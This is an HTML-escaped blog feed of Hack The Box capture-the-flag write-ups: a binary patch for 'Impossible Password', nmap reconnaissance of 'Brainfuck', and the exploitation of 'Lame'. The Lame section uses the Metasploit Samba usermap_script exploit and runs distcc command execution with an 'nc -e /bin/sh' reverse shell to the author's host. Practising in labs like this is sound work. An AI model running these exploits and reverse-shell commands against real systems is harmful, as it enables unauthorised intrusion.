&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;strcmp&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;testString&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;q3\\?C4&amp;lt;=c&amp;#39;~G#&lt;/span&gt;$&lt;span style=&#34;color:#e6db74&#34;&gt;[h8Kck&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                                &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+++ exited &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;status 3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; +++                                                                                                                                                                                                                                  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once we use the key in the first step we see another step. After I enter the second input the applications runs number of rand function before comparison&lt;/p&gt;
&lt;p&gt;We need to analyze the binary. I will use radare2 for binary analysis.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ r2 -w impossible_password.bin
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0x004006a0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&amp;gt; s main
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0x0040085d&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&amp;gt; aaa
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Analyze all flags starting with sym. and entry0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;aa&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Analyze &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; calls &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;aac&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Analyze len bytes of instructions &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; references &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;aar&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Check &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; vtables
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Type matching analysis &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; all functions &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;aaft&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Propagate noreturn information
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Use -AA or aaaa to perform additional experimental analysis.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0x0040085d&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&amp;gt; s main
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0x0040085d&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s disassembly the application&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://www.cihatyildiz.com/assets/img/htb/htb_reverse_impossible_password_1.png&#34; alt=&#34;upload-image&#34;&gt;&lt;/p&gt;
&lt;p&gt;In the assembly code we can see the &lt;em&gt;SuperSeKretKey&lt;/em&gt; in the code. When we review the rest of the code, we see that there are two &lt;em&gt;strcmp&lt;/em&gt; function in the code. Those functions used for to compare user input.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://www.cihatyildiz.com/assets/img/htb/htb_reverse_impossible_password_2.png&#34; alt=&#34;upload-image&#34;&gt;&lt;/p&gt;
&lt;p&gt;As we see above, in the line 0x0040094f, application runs a function. When you see the details this function is to generate random string number. After this line, the generated string is used in the second &lt;em&gt;strcmp&lt;/em&gt; operation. That means we will see different strings in every run and we won&amp;rsquo;t be able to match strings. The code never will come to the address &lt;em&gt;0x00400971&lt;/em&gt;. I assume the flag for this challenge is stored in the function &lt;em&gt;fcn.00400978&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;To access the function &lt;em&gt;fcn.00400978,&lt;/em&gt; we can add JMP just before 0x00400968 or change the instruction at 0x00400968. Adding NOPs would be a good option i think. I added one NOP but I got &amp;ldquo;segmentation fault&amp;rdquo;. So you need to add minimum 2 NOPs in the app&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://www.cihatyildiz.com/assets/img/htb/htb_reverse_impossible_password_3.png&#34; alt=&#34;upload-image&#34;&gt;&lt;/p&gt;
&lt;p&gt;Next step I removed the JNE instruction and added 9090 instead. After the change we can run the code again and get the flag.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://www.cihatyildiz.com/assets/img/htb/htb_reverse_impossible_password_4.png&#34; alt=&#34;upload-image&#34;&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Radare2 Tips:
V - for visual view
c - for cursor navigation
i - insert instruction
s &amp;lt;functions&amp;gt; - to select the function
pdf - print function details
aaa - analyze all referenced code 
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>Writeup - Hack The Box - Brainfuck</title>
      <link>https://www.cihatyildiz.com/post/2020-12-07-hack-the-box-brainf/</link>
      <pubDate>Sat, 24 Oct 2020 20:55:00 +0800</pubDate>
      
      <guid>https://www.cihatyildiz.com/post/2020-12-07-hack-the-box-brainf/</guid>
      <description>&lt;p&gt;In this post, I will show how I resolve the machine called Brainfuck. The difficulty of this macihne is hard.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://www.cihatyildiz.com/assets/img/htb/htb-brainfuck.png&#34; alt=&#34;upload-image&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;port-and-service-discovery&#34; &gt;Port and Service Discovery
&lt;span&gt;
    &lt;a href=&#34;#port-and-service-discovery&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;&lt;p&gt;Lets start with a basic nmap scan&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@kali:/home/kali# nmap 10.10.10.17
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-02 23:03 EST
Nmap scan report for 10.10.10.17
Host is up (0.094s latency).
Not shown: 995 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
110/tcp open  pop3
143/tcp open  imap
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 7.41 seconds
root@kali:/home/kali# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;version scanning&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@kali:/home/kali# nmap -sS -sV -p- 10.10.10.17
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-02 23:08 EST
Nmap scan report for 10.10.10.17
Host is up (0.084s latency).                                                                                                                      
Not shown: 65530 filtered ports                                                                                                                   
PORT    STATE SERVICE  VERSION                                                                                                                    
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)                                                               
25/tcp  open  smtp     Postfix smtpd                                                                                                              
110/tcp open  pop3     Dovecot pop3d                                                                                                              
143/tcp open  imap     Dovecot imapd                                                                                                              
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)                                                                                                      
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                         
                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                    
Nmap done: 1 IP address (1 host up) scanned in 166.69 seconds                                                                                     
root@kali:/home/kali# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;script scan&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@kali:/home/kali# nmap -sS -sV -sC -O -p22,25,110,143,443 10.10.10.17
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-02 23:12 EST                                                                                   
Nmap scan report for 10.10.10.17                                                                                                                  
Host is up (0.086s latency).                                                                                                                      
                                                                                                                                                  
PORT    STATE SERVICE  VERSION                                                                                                                    
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)                                                               
| ssh-hostkey:                                                                                                                                    
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)                                                                                    
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)                                                                                   
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)                                                                                 
25/tcp  open  smtp     Postfix smtpd                                                                                                              
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,                                  
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) USER PIPELINING TOP UIDL CAPA RESP-CODES AUTH-RESP-CODE
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: SASL-IR IDLE LITERAL+ LOGIN-REFERRALS ID have ENABLE Pre-login listed more capabilities OK AUTH=PLAINA0001 post-login IMAP4rev1
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.13 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 4.2 (92%), Linux 3.12 (90%), Linux 3.13 or 4.2 (90%), Linux 3.8 - 3.11 (90%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.71 seconds
root@kali:/home/kali#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There is an interesting information here about the domain names in certificate. See the below line.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Based on this information, if I add &amp;ldquo;&lt;a href=&#34;https://www.brainfuck.htb&#34;&gt;www.brainfuck.htb&lt;/a&gt;&amp;rdquo; and &amp;ldquo;sup3rs3cr3t.brainfuck.htb&amp;rdquo; in my hosts file.&lt;/p&gt;
&lt;p&gt;udp port scan&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@kali:/home/kali# nmap -sU -p- -oA udp 10.10.10.17
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-03 11:20 EST
Nmap scan report for www.brainfuck.htb (10.10.10.17)
Host is up (0.11s latency).
Not shown: 65532 open|filtered ports
PORT    STATE  SERVICE
110/udp closed pop3
143/udp closed imap
443/udp closed https

Nmap done: 1 IP address (1 host up) scanned in 1411.09 seconds
root@kali:/home/kali#
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>Writeup - Hack The Box - Lame</title>
      <link>https://www.cihatyildiz.com/post/2020-12-01-hack-the-box-lame/</link>
      <pubDate>Sat, 24 Oct 2020 20:55:00 +0800</pubDate>
      
      <guid>https://www.cihatyildiz.com/post/2020-12-01-hack-the-box-lame/</guid>
      <description>&lt;p&gt;In this post, I will show how I resolve the machine called LAME. The difficulty of this macihne is easy. This is my first post about the hack the box machines. I will write more writeups about HTB macihnes.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://www.cihatyildiz.com/assets/img/htb/htb-lame.png&#34; alt=&#34;upload-image&#34;&gt;&lt;/p&gt;
&lt;p&gt;Lame is one of the retired machined in HTB repository. But you can get access if you have premium membership which is good. Let&amp;rsquo;s start hackinng this machine :)&lt;/p&gt;
&lt;h1 id=&#34;port-and-service-discovery&#34; &gt;Port and Service Discovery
&lt;span&gt;
    &lt;a href=&#34;#port-and-service-discovery&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;&lt;p&gt;Lets start with a basic nmap scan&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@kali:/home/kali# nmap 10.10.10.3
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-19 01:05 EDT
Nmap scan report for 10.10.10.3
Host is up (0.093s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 6.63 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;scan all ports&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@kali:/home/kali# nmap -sS -p- 10.10.10.3
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-19 01:06 EDT
Nmap scan report for 10.10.10.3
Host is up (0.086s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 146.52 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;find runnnning services&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@kali:/home/kali# nmap -sS -p21,22,139,445,3632 -sV -sC -O 10.10.10.3 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-19 01:09 EDT
Nmap scan report for 10.10.10.3
Host is up (0.084s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.24
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Arris TG862G/CT cable modem (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.22 (92%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -3d00h55m00s, deviation: 2h49m43s, median: -3d02h55m01s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-10-15T22:15:17-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.00 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;vsftpd-234&#34; &gt;vsftpd 2.3.4
&lt;span&gt;
    &lt;a href=&#34;#vsftpd-234&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;&lt;p&gt;Nmap scan shows that the FTP service on the asset alloews unauthenticated login&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I see that we cannot go through the unouthenticated login&lt;/p&gt;
&lt;h1 id=&#34;smbd&#34; &gt;Smbd
&lt;span&gt;
    &lt;a href=&#34;#smbd&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@kali:/home/kali# searchsploit samba 3.0.20-Debian
--------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                       |  Path
--------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 &amp;lt; 3.3.5 - Format String / Security Bypass                                                               | multiple/remote/10095.txt
Samba 3.0.20 &amp;lt; 3.0.25rc3 - &amp;#39;Username&amp;#39; map script&amp;#39; Command Execution (Metasploit)                                     | unix/remote/16320.rb
Samba &amp;lt; 3.0.20 - Remote Heap Overflow                                                                                | linux/remote/7701.txt
Samba &amp;lt; 3.6.2 (x86) - Denial of Service (PoC)                                                                        | linux_x86/dos/36741.py
--------------------------------------------------------------------------------------------------------------------- ---------------------------------
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Metasploit&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf5 &amp;gt; use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf5 exploit(multi/samba/usermap_script) &amp;gt; info

       Name: Samba &amp;#34;username map script&amp;#34; Command Execution
     Module: exploit/multi/samba/usermap_script
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2007-05-14

Provided by:
  jduck &amp;lt;jduck@metasploit.com&amp;gt;

Available targets:
  Id  Name
  --  ----
  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;
  RPORT   139              yes       The target port (TCP)

Payload information:
  Space: 1024

Description:
  This module exploits a command execution vulnerability in Samba 
  versions 3.0.20 through 3.0.25rc3 when using the non-default 
  &amp;#34;username map script&amp;#34; configuration option. By specifying a username 
  containing shell meta characters, attackers can execute arbitrary 
  commands. No authentication is needed to exploit this vulnerability 
  since this option is used to map usernames prior to authentication!

References:
  https://cvedetails.com/cve/CVE-2007-2447/
  OSVDB (34700)
  http://www.securityfocus.com/bid/23972
  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534
  http://samba.org/samba/security/CVE-2007-2447.html

msf5 exploit(multi/samba/usermap_script) &amp;gt; show options 

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.208.182  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(multi/samba/usermap_script) &amp;gt; set rhosts 10.10.10.3
rhosts =&amp;gt; 10.10.10.3
msf5 exploit(multi/samba/usermap_script) &amp;gt; set lhost 10.10.14.15
lhost =&amp;gt; 10.10.14.15
msf5 exploit(multi/samba/usermap_script) &amp;gt; exploit

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Command shell session 1 opened (10.10.14.15:4444 -&amp;gt; 10.10.10.3:54761) at 2020-10-29 03:02:39 -0400

id
uid=0(root) gid=0(root)
ls /root
Desktop
reset_logs.sh
root.txt
vnc.log
cat /root/root.txt
92caac3be140ef409e45721348a4e9df
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;distccd&#34; &gt;distccd
&lt;span&gt;
    &lt;a href=&#34;#distccd&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kali@kali:~$ nmap -p 3632 --script distcc-cve2004-2687 --script-args=&amp;#34;distcc-exec.cmd=&amp;#39;id&amp;#39;&amp;#34; 10.10.10.3 -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 02:55 EDT
Nmap scan report for 10.10.10.3
Host is up (0.091s latency).

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-cve2004-2687: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|_      https://distcc.github.io/security.html

Nmap done: 1 IP address (1 host up) scanned in 0.86 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;run command on the server&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@kali:/home/kali# nmap -p 3632 --script distcc-cve2004-2687 --script-args=&amp;#34;distcc-cve2004-2687.cmd=&amp;#39;nc -e /bin/sh 10.10.14.15 9999&amp;#39;&amp;#34; 10.10.10.3 -PnStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 02:58 EDT
Nmap scan report for 10.10.10.3
Host is up (0.083s latency).

PORT     STATE SERVICE
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 30.49 seconds
root@kali:/home/kali# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;run listener&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kali@kali:~$ nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.3] 34436
id
